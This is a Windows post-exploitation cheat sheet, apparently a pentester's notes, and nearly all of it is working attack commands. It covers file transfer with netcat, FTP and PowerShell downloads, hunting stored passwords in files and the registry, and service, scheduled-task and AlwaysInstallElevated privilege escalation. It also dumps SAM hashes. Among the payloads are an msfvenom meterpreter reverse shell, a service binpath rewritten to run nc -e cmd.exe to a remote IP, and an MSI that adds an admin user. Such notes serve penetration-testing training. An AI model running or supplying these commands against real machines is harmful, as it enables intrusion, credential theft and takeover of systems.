# __Kapi Windows Post Exploitation Cheatsheet__
## __1. Objective__
To maintain knowledge of:
* Post exploitation on Windows machines
* This cheat covers only through pivoting but not covering trace

## __2. Post Exploitation - Linux__
### __2.1 Files Transfer__
__Netcat__
* Receiver
```
nc -l -p 1234 > out.file
```

* Sender
```
nc -w 3 <destination> 1234 < out.file
```

__FTP__
* FTP server using Python
```
apt-get install python-pyftpdlib

python -m pyftpdlib -p 21
```

* Download file from FTP server

```
echo open 192.168.2.1 21 >> ftp &echo user user P@ssw0rd >> ftp &echo binary >> ftp &echo get /myfolder/exploit.txt >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp
```

__HTTP__
* HTTP server using Python
```
python -m SimpleHTTPServer 8081
```

* Download file from HTTP server
```
powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.98.128:8009/exploit.txt','C:\Users\jkhamchaiyaphum\Desktop\exploit.txt')
```

____

### __2.2 Privilege Escalation__
__2.2.0 Check the environment__
* System information
```
systeminfo
```

* Check hostname
```
hostname
```

* Current user & domain
```
whoami
echo %username%
echo %userdomain%
query user
WMIC COMPUTERSYSTEM GET USERNAME
```

* Firewall state check
```
netsh firewall show state
```

* Firewall config check
```
netsh firewall show config
```

* Check network
```
ipconfig /all
route print
arp -A
```

* check patched
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

* Search for credentials store in files
```
findstr /si password *.txt

dir /s *pass* == *cred* == *vnc* == *.config*

findstr /spin "password" *.*


```

* The files/reg which could store password
```
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

__2.2.1 Escalate privilege - Unquoted Service Paths__
* Find unquoted services 
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

meterpreter > shell
Process 4024 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\testuser\Desktop>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
Vulnerable Service                                      Vulnerable Service                   C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe                   Auto       
C:\Users\testuser\Desktop>
```
The service running without quote path C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

* Check permission of that folder
```
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Program Files (x86)\Program Folder>icacls "C:\Program Files (x86)\Program Folder"
icacls "C:\Program Files (x86)\Program Folder"
C:\Program Files (x86)\Program Folder Everyone:(OI)(CI)(F)
                                      NT SERVICE\TrustedInstaller:(I)(F)
                                      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                      BUILTIN\Administrators:(I)(F)
                                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                      BUILTIN\Users:(I)(RX)
                                      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
Successfully processed 1 files; Failed processing 0 files
C:\Program Files (x86)\Program Folder>
```

* Create malicious EXE file name be like first part of the program

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
```

Then upload our program to C:\Program Files (x86)\Program Folder\

Then our program should place at C:\Program Files (x86)\Program Folder\A.exe

Now we restart the service.

```
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

It could be error like access denied because usually we has no permission on this service. So we could restart the server using shutdown command or wait for someone who are going to restart the service for us.


__2.2.2 Escalate privilege - Weak Service Permissions__

Some service has misconfiguration for its permission. Low privilege user could modify service's property. Windows will execute the service using high privilege account. The following script automatic query service name and displayname for every service and try to reconfig displayname with the same as previous value if the config successfully done we could modify bin path for that service to execute our malicious binary. 

```cmd
SC query state= all | FOR /F "tokens=2" %i IN ('FIND /I "SERVICE_NAME"') DO @(
SET SERVICE_NAME=%i
SC QC %i | FOR /F "tokens=2 delims=:" %k IN ('FIND /I "DISPLAY_NAME"') DO @(FOR /F "tokens=* delims= " %y IN ("%k") DO (SC CONFIG %i DisplayName= "%y"))
)
```

If successful result found then try to modify service using SC command.

```
sc config upnphost binpath= "C:\WINDOWS\System32\cmd.exe /C ipconfig"

sc config upnphost binpath= "C:\Inetpub\nc.exe -nv 10.11.0.110 5555 -e C:\WINDOWS\System32\cmd.exe"

sc stop upnphost
sc start upnphost

If it did not work try 
sc config upnphost obj= ".\LocalSystem" password= ""
```

__2.2.3 Escalate privilege - AlwaysInstallElevated__
AlwaysInstallElevated is a policy setting that directs Windows Installer to use elevated permissions when it installs any package on the system. If this policy setting is enabled, privileges are extended to all programs.
* Check for the following registry key
```
[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Note:  If you happen to get an error message similar to: The system was unable to find the specified registry key or value, it may be that a Group Policy setting for AlwaysInstallElevated was never defined, and therefore an associated registry entry doesnâ€™t exist.

* Generate payload
```
msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
```

* Execute MSI file silencely
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
```

__2.2.4 Escalate privilege - Schedule Task__
Find task that create by admin but the binary could be accessed by everyone

* Check schedule
```
schtasks /query /fo LIST /v | findstr /c:"TaskName" /i /r /c:"Task To Run" /c:"Next Run Time" /c:"Run As User.*System"

TaskName:                             \Microsoft\Configuration Manager\Configuration Manager Health Evaluation
Next Run Time:                        N/A
Task To Run:                          C:\WINDOWS\CCM\ccmeval.exe
Run As User:                          SYSTEM

cacls C:\WINDOWS\CCM\ccmeval.exe

C:\WINDOWS\system32>cacls C:\WINDOWS\CCM\ccmeval.exe
C:\WINDOWS\CCM\ccmeval.exe NT AUTHORITY\SYSTEM:(I)(F)
                           BUILTIN\Administrators:(I)(F)
                           BUILTIN\Users:(I)(F)
                           Everyone:(F)
```
If compromised user could modify the binary. We could rename it and place our malicious binary with the same name and wait for task to execute.




__2.2.4 Escalate privilege - Kernel exploit__

Check kernel and OS distribution then seach for public exploits

## __Dumping Hash - Registry__
```
reg save hklm\sam c:\sam_x
reg save hklm\system c:\system_x
```


## __Reference & Credits__
* http://www.fuzzysecurity.com/tutorials/16.html
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
* https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html